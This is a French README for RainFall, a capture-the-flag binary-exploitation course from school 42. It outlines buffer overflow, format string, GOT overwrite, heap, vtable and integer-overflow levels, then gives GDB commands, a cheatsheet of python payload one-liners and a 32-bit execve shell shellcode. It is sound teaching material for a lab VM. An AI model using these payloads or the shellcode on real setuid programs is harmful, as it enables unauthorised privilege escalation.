# 🌧️ RainFall

## 📋 Description du projet

RainFall est un projet CTF (Capture The Flag) d'introduction à l'exploitation binaire de l'école 42. Il se présente sous la forme d'une machine virtuelle ISO contenant 14 niveaux (level0 à level9 + bonus0 à bonus3) où chaque niveau expose une vulnérabilité de sécurité à exploiter pour progresser.

Le projet adopte une approche orientée développeur : comprendre comment de simples erreurs de programmation dans des binaires 32-bit Linux peuvent créer des failles de sécurité exploitables.

---

## 🎯 Objectifs pédagogiques

- Identifier et exploiter des vulnérabilités dans des binaires compilés
- Développer une méthodologie d'analyse de binaires inconnus
- Comprendre l'architecture x86 et la convention d'appel cdecl
- Maîtriser les attaques classiques : buffer overflow, format string, heap overflow
- Se familiariser avec GDB pour l'analyse dynamique
- Prendre conscience des risques liés aux fonctions C dangereuses (`gets`, `printf`, `strcpy`)

---

## 🏗️ Structure du projet

### Organisation des niveaux

- `level0` à `level9` : partie obligatoire (10 niveaux)
- `bonus0` à `bonus3` : partie bonus (4 niveaux)

### Utilisateurs système

- `levelXX` : compte utilisateur pour chaque niveau
- Le binaire est **setuid** du niveau suivant

### Workflow

1. Se connecter en tant que `levelXX`
2. Analyser le binaire avec GDB / objdump / ltrace
3. Trouver et exploiter la vulnérabilité
4. Obtenir un shell avec les droits du niveau suivant
5. Récupérer le mot de passe dans `/home/user/levelXX/.pass`

---

## 📚 Notions abordées par niveau

### Level0 — Integer Comparison Bypass
- **Vulnérabilité** : Comparaison entière avec une valeur fixe
- **Techniques** : Lecture du disassembly, conversion hex/décimal
- **Outils** : GDB, `atoi` analysis

### Level1 — Stack Buffer Overflow
- **Vulnérabilité** : `gets()` sans vérification de taille
- **Techniques** : Écrasement de la return address, redirection vers fonction existante
- **Outils** : GDB, pattern cyclique, python payload

### Level2 — Stack Overflow + Heap Shellcode
- **Vulnérabilité** : `gets()` avec vérification d'adresse de pile
- **Techniques** : Injection de shellcode sur la heap via `strdup`, bypass de protection `0xb0000000`
- **Outils** : GDB, ltrace, shellcode 32-bit

### Level3 — Format String Attack
- **Vulnérabilité** : `printf(buffer)` sans format string fixe
- **Techniques** : Lecture de pile avec `%x`, écriture avec `%n`, offset direct `%4$n`
- **Outils** : GDB, python, objdump

### Level4 — Format String (Large Value Write)
- **Vulnérabilité** : `printf(buffer)` — écriture d'une grande valeur
- **Techniques** : Padding avec `%.Nx` pour écrire `0x1025544` via `%n`
- **Outils** : GDB, python, calcul de padding

### Level5 — Format String GOT Overwrite
- **Vulnérabilité** : `printf(buffer)` — réécriture de la GOT
- **Techniques** : Interception de `exit()` via GOT overwrite, redirection vers `o()`
- **Outils** : GDB, python

### Level6 — Heap Buffer Overflow (Function Pointer)
- **Vulnérabilité** : `strcpy` sans limite dans un buffer heap
- **Techniques** : Écrasement d'un pointeur de fonction dans le chunk suivant
- **Outils** : GDB, ltrace, calcul d'offset heap

### Level7 — Heap Overflow (Double strcpy GOT)
- **Vulnérabilité** : `strcpy` débordant sur un pointeur heap
- **Techniques** : Écrasement de `chunk->buf` pour rediriger le second `strcpy` dans la GOT
- **Outils** : GDB, ltrace

### Level8 — Logic Flaw (Heap Memory Layout)
- **Vulnérabilité** : Vérification de `auth+0x20` sans s'assurer de son contenu
- **Techniques** : Allocation successive de `service` pour remplir la heap jusqu'à `auth+0x20`
- **Outils** : GDB, analyse de la heap

### Level9 — C++ Vtable Hijack
- **Vulnérabilité** : `memcpy` sans limite dans `setAnnotation()`
- **Techniques** : Écrasement du vtable pointer d'un objet C++, injection de shellcode
- **Outils** : GDB, pattern cyclique, shellcode 32-bit

### Bonus0 — Stack Overflow (NOP Sled)
- **Vulnérabilité** : `strcpy` + `strcat` sans limite, `strncpy` sans null terminator
- **Techniques** : NOP sled dans le grand buffer temporaire de `p()`, calcul d'offset précis
- **Outils** : GDB, ltrace, python, shellcode 32-bit

### Bonus1 — Integer Overflow
- **Vulnérabilité** : Vérification signée contournée par un entier négatif
- **Techniques** : Wrapping 32-bit de `n * 4` pour obtenir 44 bytes dans `memcpy`
- **Outils** : GDB, calcul modulo 2^32, python

### Bonus2 — Buffer Overflow (LANG Environment Variable)
- **Vulnérabilité** : `strcat` sans limite dans `greetuser()`
- **Techniques** : Exploitation de la longueur variable du message selon `LANG=fi`, NOP sled
- **Outils** : GDB, ltrace, python, shellcode 32-bit

### Bonus3 — Logic Flaw (atoi + strcmp bypass)
- **Vulnérabilité** : `atoi("")` retourne 0, tronquant le buffer au premier byte
- **Techniques** : `strcmp("", "")` retourne 0 → shell
- **Outils** : GDB, analyse du disassembly

---

## 🧠 Concepts clés

### Stack Buffer Overflow

```
[ buffer        ]
[ saved ebp     ]
[ return address ]  ← écraser pour rediriger l'exécution
```

Quand `gets()` ou `strcpy()` écrit au-delà du buffer, il écrase la return address.

### Format String Attack

```c
printf(buffer);        // dangereux — l'utilisateur contrôle le format
printf("%s", buffer);  // sûr
```

```
%x    → lire des valeurs sur la pile
%n    → écrire le nombre de chars affichés à une adresse
%4$n  → écrire directement au 4ème argument
```

### GOT Overwrite

La GOT (Global Offset Table) stocke les adresses des fonctions externes. Étant modifiable, écraser une entrée redirige tout appel ultérieur à cette fonction.

```
GOT[exit] = adresse de o()
→ le prochain appel à exit() saute vers o() !
```

### Heap Buffer Overflow

```
heap :
[ chunk1 ][ metadata ][ chunk2 : function ptr ]
     ↑
overflow → écrase le pointeur de fonction dans chunk2
```

### C++ Vtable Hijack

```
objet C++ :
[ vtable ptr ] → [ func1 ][ func2 ][ func3 ]
                      ↑
écraser vtable ptr → fausse vtable → shellcode
```

### Integer Overflow

```c
memcpy(buffer, src, n * 4)   // n est signé, size_t est non signé

n = -1073741813
n * 4 = -4294967252
en unsigned 32-bit = 44 bytes  ← wrapping !
```

---

## 🛠️ Outils utilisés

| Outil | Usage |
|-------|-------|
| `gdb` | Analyse dynamique, breakpoints, inspection mémoire |
| `ltrace` | Traçage des appels de bibliothèque |
| `ghidra` | Décompilation et reverse engineering |
| `python` | Génération de payloads |

---

## 📖 Commandes GDB utiles

```bash
# désassembler une fonction
(gdb) disass main
(gdb) disass func

# inspecter la mémoire
(gdb) x/40xw $esp        # dump 40 mots depuis esp
(gdb) x/s 0x8048540      # afficher une string à une adresse
(gdb) x/x $ebp+0x8       # valeur à ebp+8

# inspecter les registres
(gdb) i r                # tous les registres
(gdb) i r $eip $esp $ebp # registres spécifiques

# breakpoints
(gdb) b *main+84         # break à un offset
(gdb) b *0x08048473      # break à une adresse

# trouver l'offset avec un pattern cyclique
(gdb) r Aa0Aa1Aa2Aa3...
(gdb) i r $eip           # noter la valeur → décoder l'offset
```

---

## 💡 Cheatsheet Payloads

```bash
# buffer overflow — écraser la return address
python -c "print('A'*offset + '\xef\xbe\xad\xde')" | ./binary

# format string — lire la pile
python -c "print('AAAA' + '_%x'*10)" | ./binary

# format string — écrire à une adresse
python -c "print('\x38\x98\x04\x08' + '%134513822x' + '%4\$n')" | ./binary

# injection de shellcode
python -c "print('\x90'*NOP + SHELLCODE + 'A'*pad + addr)" | ./binary

# integer overflow
./binary -1073741813 $(python -c "print('A'*40 + '\x46\x4c\x4f\x57')")
```

---

## 🐚 Shellcode 32-bit Linux

```asm
; execve("/bin//sh", ["/bin//sh", NULL], NULL)
\x31\xc0        ; xor eax, eax
\x99            ; cdq
\x50            ; push eax
\x68\x2f\x2f\x73\x68  ; push "//sh"
\x68\x2f\x62\x69\x6e  ; push "/bin"
\x89\xe3        ; mov ebx, esp
\x50            ; push eax
\x53            ; push ebx
\x89\xe1        ; mov ecx, esp
\xb0\x0b        ; mov al, 11
\xcd\x80        ; int 0x80
; 24 bytes total
```

---

## 📝 Notes importantes

- Tous les binaires sont des **ELF 32-bit** (`-m32`)
- Les binaires sont **setuid** — les exploits doivent tourner sur la VM RainFall
- GDB **désactive le setuid** via `ptrace` — certains exploits ne fonctionnent qu'en dehors de GDB
- Les adresses peuvent différer entre GDB et l'exécution normale à cause de l'environnement

---

## 👥 Auteurs

| Auteur | GitHub |
|--------|--------|
| jln-nguyen | [@jln-nguyen](https://github.com/jln-nguyen) |
| Icham J | [@icr4m](https://github.com/icr4m) | 
